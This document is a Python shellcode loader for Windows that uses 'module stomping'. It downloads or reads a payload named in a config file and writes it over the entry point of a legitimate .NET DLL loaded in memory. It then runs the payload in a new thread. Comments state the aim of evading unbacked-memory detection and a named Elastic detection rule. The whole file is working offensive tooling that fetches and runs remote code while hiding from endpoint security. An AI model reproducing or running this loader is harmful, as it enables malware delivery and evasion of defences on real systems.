"""
moduleStomping.py - Module Stomping shellcode loader
Loads a legitimate DLL, overwrites its .text section with shellcode.
Memory stays MEM_IMAGE (file-backed) - evades unbacked memory detection.

Use non-System32 DLL to avoid Elastic's image_hollow_from_unusual_stack rule.
"""
import ctypes
import ctypes.wintypes
import struct
import sys
import os

kernel32 = ctypes.windll.kernel32

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
INFINITE = 0xFFFFFFFF

# Default: non-System32 DLL with large .text section
STOMP_DLL = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscordacwks.dll"

def load_payload():
    config_paths = [
        os.path.join(os.getcwd(), "config.conf"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.conf"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "config.conf"),
    ]

    payload_path = None
    config_dir = "."
    for cp in config_paths:
        print(f"[i] Looking for config at: {cp}")
        if os.path.exists(cp):
            print(f"[+] Found config.conf at: {cp}")
            config_dir = os.path.dirname(cp)
            with open(cp) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("payload_path="):
                        payload_path = line.split("=", 1)[1]
            break

    if not payload_path:
        print("[-] config.conf not found or no payload_path")
        sys.exit(1)

    if not os.path.isabs(payload_path):
        payload_path = os.path.join(config_dir, "..", payload_path.replace("\\", os.sep))
    payload_path = os.path.normpath(payload_path)

    print(f"[*] Step 1: Downloading payload")
    if payload_path.startswith("http"):
        import urllib.request
        print(f"[+] Target is a URL. Downloading from: {payload_path}")
        shellcode = urllib.request.urlopen(payload_path).read()
    else:
        print(f"[+] Target is a local file. Loading from: {payload_path}")
        with open(payload_path, "rb") as f:
            shellcode = f.read()

    print(f"[+] Loaded {len(shellcode)} bytes")
    return shellcode

def parse_pe_sections(base_addr):
    """Parse PE headers at base_addr, return list of (name, va, vsize, rawsize)"""
    # DOS header: e_lfanew at offset 0x3C
    e_lfanew = ctypes.c_uint32()
    ctypes.memmove(ctypes.byref(e_lfanew), base_addr + 0x3C, 4)

    nt_headers_addr = base_addr + e_lfanew.value

    # PE signature (4 bytes) + FileHeader (20 bytes)
    # NumberOfSections at offset 6 from FileHeader start
    num_sections = ctypes.c_uint16()
    ctypes.memmove(ctypes.byref(num_sections), nt_headers_addr + 4 + 2, 2)

    # SizeOfOptionalHeader at offset 16 from FileHeader start
    opt_header_size = ctypes.c_uint16()
    ctypes.memmove(ctypes.byref(opt_header_size), nt_headers_addr + 4 + 16, 2)

    # AddressOfEntryPoint at offset 16 in OptionalHeader
    entry_point_rva = ctypes.c_uint32()
    ctypes.memmove(ctypes.byref(entry_point_rva), nt_headers_addr + 4 + 20 + 16, 4)

    # Section headers start after optional header
    section_start = nt_headers_addr + 4 + 20 + opt_header_size.value

    sections = []
    for i in range(num_sections.value):
        sec_addr = section_start + i * 40
        name_buf = (ctypes.c_char * 8)()
        ctypes.memmove(name_buf, sec_addr, 8)
        name = name_buf.value.decode('ascii', errors='ignore')

        vsize = ctypes.c_uint32()
        ctypes.memmove(ctypes.byref(vsize), sec_addr + 8, 4)

        va = ctypes.c_uint32()
        ctypes.memmove(ctypes.byref(va), sec_addr + 12, 4)

        rawsize = ctypes.c_uint32()
        ctypes.memmove(ctypes.byref(rawsize), sec_addr + 16, 4)

        sections.append((name, va.value, vsize.value, rawsize.value))

    return sections, entry_point_rva.value, num_sections.value

def main():
    dll_path = STOMP_DLL
    if len(sys.argv) > 1:
        dll_path = sys.argv[1]

    shellcode = load_payload()

    print("[*] Starting Module Stomping")
    print(f"[*] Step 2: Loading sacrificial DLL")

    h_module = kernel32.LoadLibraryW(dll_path)
    if not h_module:
        print(f"[-] LoadLibrary failed for {dll_path}")
        # Try fallback
        dll_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll"
        h_module = kernel32.LoadLibraryW(dll_path)
        if not h_module:
            print("[-] Fallback also failed")
            sys.exit(1)

    print(f"[+] {dll_path} loaded at: 0x{h_module:016x}")

    sections, ep_rva, num_sections = parse_pe_sections(h_module)
    entry_point = h_module + ep_rva
    print(f"[+] Entry point: 0x{entry_point:016x}")
    print(f"[+] Number of sections: {num_sections}")

    text_va = None
    text_vsize = None
    for name, va, vsize, rawsize in sections:
        print(f"[DEBUG] Section: '{name}' VA=0x{va:x} VSize={vsize} RawSize={rawsize}")
        if name.startswith(".text"):
            text_va = va
            text_vsize = vsize

    if text_va is None:
        print("[-] .text section not found")
        sys.exit(1)

    text_addr = h_module + text_va
    print(f"[+] Found .text section at: 0x{text_addr:016x}, size: {text_vsize}")
    print(f"[+] Payload size: {len(shellcode)} bytes")

    if len(shellcode) > text_vsize:
        print(f"[-] Payload ({len(shellcode)}) exceeds .text ({text_vsize})")
        sys.exit(1)
    print("[+] Payload size verification passed")

    print("[*] Step 3: Stomping module memory")
    old_protect = ctypes.wintypes.DWORD(0)
    kernel32.VirtualProtect(
        ctypes.c_void_p(entry_point),
        len(shellcode),
        PAGE_READWRITE,
        ctypes.byref(old_protect)
    )
    print("[+] Memory protection changed to RW")

    ctypes.memmove(entry_point, shellcode, len(shellcode))
    print("[+] Payload written to entry point")

    tmp_protect = ctypes.wintypes.DWORD(0)
    kernel32.VirtualProtect(
        ctypes.c_void_p(entry_point),
        len(shellcode),
        old_protect.value,
        ctypes.byref(tmp_protect)
    )
    print("[+] Memory protection restored")
    print("[+] Module stomping completed")

    print("[*] Step 4: Executing payload via CreateThread")
    thread_handle = kernel32.CreateThread(
        ctypes.c_void_p(0), 0,
        ctypes.c_void_p(entry_point),
        ctypes.c_void_p(0), 0,
        ctypes.c_void_p(0)
    )
    if not thread_handle:
        print(f"[-] CreateThread failed")
        sys.exit(1)

    print("[+] Thread created successfully")
    kernel32.WaitForSingleObject(thread_handle, INFINITE)

if __name__ == "__main__":
    main()
